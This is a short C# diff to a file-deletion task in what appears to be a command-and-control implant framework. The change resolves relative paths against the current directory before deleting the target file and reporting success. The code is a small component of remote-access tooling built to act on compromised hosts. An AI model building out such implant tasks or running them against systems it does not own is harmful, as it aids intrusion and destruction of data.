@@ -11,10 +11,13 @@ namespace Implant.Tasks.Execute
         public override string Execute(ImplantTask task)
         {
             targetFile = task.Args;
+            var currentDir = Directory.GetCurrentDirectory();
 
+            if (!(targetFile.Contains(currentDir))) { targetFile = $"{currentDir}\\{task.Args}"; }
+            
             File.Delete(targetFile);
 
-            if(!(File.Exists(targetFile))) { return $"[*] {targetFile} removed\n"; }
+            if (!(File.Exists(targetFile))) { return $"[*] {targetFile} removed\n"; }
             return $"[-] Failed to remove {targetFile}\n";
         }
     }
